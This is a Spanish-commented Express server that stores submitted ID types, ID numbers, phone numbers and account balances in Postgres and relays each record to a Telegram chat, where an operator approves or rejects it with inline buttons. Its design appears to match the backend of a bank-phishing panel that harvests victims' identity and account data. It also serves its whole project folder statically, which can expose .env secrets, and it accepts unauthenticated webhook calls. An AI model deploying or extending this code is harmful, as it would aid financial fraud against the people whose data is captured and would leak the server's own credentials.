// server.js — Servidor Express principal
require('dotenv').config();

const express  = require('express');
const cors     = require('cors');
const { Pool } = require('pg');
const fetch    = require('node-fetch');
const path     = require('path');

const app  = express();
const PORT = process.env.PORT || 3000;

// ─── Base de datos ──────────────────────────────────────────────────────────
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL
    ? { rejectUnauthorized: false }  // requerido por Neon y Render
    : false
});

// ─── Telegram ───────────────────────────────────────────────────────────────
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID   = process.env.CHAT_ID;
const TG_API    = `https://api.telegram.org/bot${BOT_TOKEN}`;

async function sendTelegram(clienteId, data) {
  const texto =
    `🔔 *Nuevo registro #${clienteId}*\n\n` +
    `📋 *Tipo doc:* ${data.tipo_documento}\n` +
    `🪪 *Documento:* ${data.num_documento}\n` +
    `📱 *Celular:* ${data.num_celular}\n` +
    `💰 *Saldo:* ${data.saldo_cuenta}\n` +
    `📊 *Estado:* pendiente`;

  const botones = {
    inline_keyboard: [[
      { text: '✅ Aprobar',      callback_data: `aprobar:${clienteId}` },
      { text: '❌ Rechazar',     callback_data: `rechazar:${clienteId}` },
      { text: '⏳ En revisión',  callback_data: `revision:${clienteId}` }
    ]]
  };

  const res = await fetch(`${TG_API}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id:      CHAT_ID,
      text:         texto,
      parse_mode:   'Markdown',
      reply_markup: botones
    })
  });

  return res.json();
}

async function editTelegram(messageId, clienteId, nuevoEstado) {
  const emojis = {
    aprobado:    '✅ Aprobado',
    rechazado:   '❌ Rechazado',
    en_revision: '⏳ En revisión'
  };

  const label = emojis[nuevoEstado] || nuevoEstado;

  // Obtener cliente de la DB para reconstruir el mensaje
  const { rows } = await pool.query('SELECT * FROM clientes WHERE id = $1', [clienteId]);
  if (!rows.length) return;
  const c = rows[0];

  const texto =
    `🔔 *Registro #${clienteId}* — *${label}*\n\n` +
    `📋 *Tipo doc:* ${c.tipo_documento}\n` +
    `🪪 *Documento:* ${c.num_documento}\n` +
    `📱 *Celular:* ${c.num_celular}\n` +
    `💰 *Saldo:* ${c.saldo_cuenta}\n` +
    `📊 *Estado:* ${label}`;

  // Si ya fue procesado, quitar botones
  await fetch(`${TG_API}/editMessageText`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id:    CHAT_ID,
      message_id: messageId,
      text:       texto,
      parse_mode: 'Markdown'
    })
  });
}

// ─── Middleware ─────────────────────────────────────────────────────────────
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir archivos estáticos desde la raíz (donde está index.html e img/)
app.use(express.static(__dirname));

// ─── Rutas ──────────────────────────────────────────────────────────────────

// GET / → sirve index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// POST /submit → guardar datos + notificar Telegram
app.post('/submit', async (req, res) => {
  const { tipo_documento, num_documento, num_celular, saldo_cuenta } = req.body;

  // Validación básica en servidor
  if (!tipo_documento || !num_documento || !num_celular || !saldo_cuenta) {
    return res.status(400).json({ ok: false, mensaje: 'Todos los campos son requeridos.' });
  }

  try {
    // Insertar en DB
    const result = await pool.query(
      `INSERT INTO clientes (tipo_documento, num_documento, num_celular, saldo_cuenta)
       VALUES ($1, $2, $3, $4) RETURNING id`,
      [tipo_documento, num_documento, num_celular, saldo_cuenta]
    );

    const clienteId = result.rows[0].id;

    // Enviar a Telegram
    await sendTelegram(clienteId, { tipo_documento, num_documento, num_celular, saldo_cuenta });

    res.json({ ok: true, id: clienteId, mensaje: '✅ Datos enviados correctamente. En breve recibirás una respuesta.' });

  } catch (err) {
    console.error('Error en /submit:', err.message);
    res.status(500).json({ ok: false, mensaje: 'Error interno del servidor.' });
  }
});

// POST /webhook → recibir callbacks de botones de Telegram
app.post('/webhook', async (req, res) => {
  const update = req.body;
  res.sendStatus(200); // Responder rápido a Telegram

  try {
    const callback = update.callback_query;
    if (!callback) return;

    const [accion, clienteIdStr] = callback.data.split(':');
    const clienteId  = parseInt(clienteIdStr);
    const messageId  = callback.message.message_id;

    const estadoMap = {
      aprobar:  'aprobado',
      rechazar: 'rechazado',
      revision: 'en_revision'
    };

    const nuevoEstado = estadoMap[accion];
    if (!nuevoEstado) return;

    // Actualizar estado en DB
    await pool.query(
      'UPDATE clientes SET estado = $1 WHERE id = $2',
      [nuevoEstado, clienteId]
    );

    // Editar el mensaje en Telegram
    await editTelegram(messageId, clienteId, nuevoEstado);

    // Responder al callback (quita el "reloj" del botón)
    await fetch(`${TG_API}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: `Estado actualizado a: ${nuevoEstado}`
      })
    });

  } catch (err) {
    console.error('Error en /webhook:', err.message);
  }
});

// ─── Exportar para Vercel (serverless) o iniciar localmente ─────────────────
if (require.main === module) {
  // Modo local: node server.js
  app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en http://localhost:${PORT}`);
    console.log(`📡 Webhook Telegram: POST /webhook`);
  });
} else {
  // Modo Vercel: exporta el app para la función serverless
  module.exports = app;
}
